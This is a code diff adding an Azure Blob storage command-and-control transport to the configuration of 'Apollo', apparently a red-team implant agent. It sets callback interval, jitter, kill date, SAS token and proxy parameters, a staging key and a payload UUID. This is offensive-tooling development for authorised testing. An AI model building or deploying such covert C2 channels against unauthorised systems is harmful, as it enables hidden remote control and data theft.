@@ -7,6 +7,7 @@
 //#define WEBSOCKET
 //#define TCP
 //#define SMB
+//#define AZURE_BLOB
 #endif
 
 #if HTTP
@@ -27,6 +28,9 @@ using NamedPipeTransport;
 #endif
 #if TCP
 using TcpTransport;
+#endif
+#if AZURE_BLOB
+using AzureBlobTransport;
 #endif
 namespace Apollo
 {
@@ -147,6 +151,45 @@ namespace Apollo
                 }
             }
 #endif
+#if AZURE_BLOB
+            { "azure_blob", new C2ProfileData()
+                {
+                    TC2Profile = typeof(AzureBlobProfile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+#if LOCAL_BUILD
+                        { "blob_endpoint", "https://yourstorageaccount.blob.core.windows.net" },
+                        { "container_name", "agent-test12345ab" },
+                        { "sas_token", "your_test_sas_token_here" },
+                        { "callback_interval", "5" },
+                        { "callback_jitter", "10" },
+                        { "encrypted_exchange_check", "T" },
+                        { "killdate", "-1" },
+                        { "enable_certificate_check", "true" },
+                        { "proxy_host", "" },
+                        { "proxy_port", "" },
+                        { "proxy_user", "" },
+                        { "proxy_pass", "" },
+#else
+                        { "blob_endpoint", "azure_blob_blob_endpoint_here" },
+                        { "container_name", "azure_blob_container_name_here" },
+                        { "sas_token", "azure_blob_sas_token_here" },
+                        { "callback_interval", "azure_blob_callback_interval_here" },
+                        { "callback_jitter", "azure_blob_callback_jitter_here" },
+                        { "encrypted_exchange_check", "azure_blob_encrypted_exchange_check_here" },
+                        { "killdate", "azure_blob_killdate_here" },
+                        { "enable_certificate_check", "azure_blob_enable_certificate_check_here" },
+                        { "proxy_host", "azure_blob_proxy_host_here" },
+                        { "proxy_port", "azure_blob_proxy_port_here" },
+                        { "proxy_user", "azure_blob_proxy_user_here" },
+                        { "proxy_pass", "azure_blob_proxy_pass_here" },
+#endif
+                    }
+                }
+            },
+#endif
         };
 
 
@@ -160,6 +203,8 @@ namespace Apollo
         public static string StagingRSAPrivateKey = "NNLlAegRMB8DIX7EZ1Yb6UlKQ4la90QsisIThCyhfCc=";
 #elif TCP
         public static string StagingRSAPrivateKey = "Zq24zZvWPRGdWwEQ79JXcHunzvcOJaKLH7WtR+gLiGg=";
+#elif AZURE_BLOB
+        public static string StagingRSAPrivateKey = "R3BLdG9OZXdBenVyZUJsb2JQcm9maWxlS2V5MTIzNA==";
 #endif
 #if HTTP
         public static string PayloadUUID = "b40195db-22e5-4f9f-afc5-2f170c3cc204";
@@ -169,6 +214,8 @@ namespace Apollo
         public static string PayloadUUID = "aff94490-1e23-4373-978b-263d9c0a47b3";
 #elif TCP
         public static string PayloadUUID = "bfc167ea-9142-4da3-b807-c57ae054c544";
+#elif AZURE_BLOB
+        public static string PayloadUUID = "d1eefaf1-99c7-1901-ded0-3fac2312abdc";
 #endif
 #else
         // TODO: Make the AES key a config option specific to each profile
